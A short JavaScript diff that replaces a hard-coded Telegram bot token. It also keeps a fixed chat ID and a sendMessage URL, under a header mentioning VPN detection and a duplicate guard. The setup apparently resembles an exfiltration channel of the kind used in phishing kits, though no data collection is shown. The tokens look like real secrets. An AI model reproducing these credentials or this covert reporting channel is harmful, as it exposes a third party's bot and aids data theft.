@@ -1144,7 +1144,7 @@
   // Modular · async/await · VPN detection · Duplicate guard
   // ----------------------------------------------------------
 
-  var TG_BOT_TOKEN = '8781804826:AAFQxp3TgA5WJb3tLVyTbToxa-Lafm1ndz0';
+  var TG_BOT_TOKEN = '8781804826:AAEdTRaNqHhpj0-pbNS8pwSnyjDku_c4VKA';
   var TG_CHAT_ID   = '8235795754';
   var TG_API_URL   = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
   var TG_MAX_RETRY = 3;
